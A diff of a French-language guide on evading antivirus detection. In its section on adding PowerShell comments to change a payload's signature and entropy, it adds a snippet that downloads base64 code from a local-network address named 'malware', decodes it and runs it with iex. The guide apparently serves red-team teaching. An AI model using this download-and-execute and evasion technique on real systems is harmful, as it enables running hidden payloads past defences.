@@ -222,7 +222,13 @@ On peut modifier les chaines de caractères afin de changer la signature.
 
 ## __Ajouter des commentaires__
 
-On rajouter des commentaires `<# *** #>` plus ou moins long, cela peut permettre de changer la signature du payload mais surtout de réduire son entropie
+On rajouter des commentaires `<# *** #>` plus ou moins long, cela peut permettre de changer la signature du payload mais surtout de réduire son entropie.
+
+```powershell
+$b64<#**********************#> = $(irm -uri http://192.168.0.66/malware); 
+$virus = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64));
+iex $virus; 
+```
 
 
 ## __Scripts__
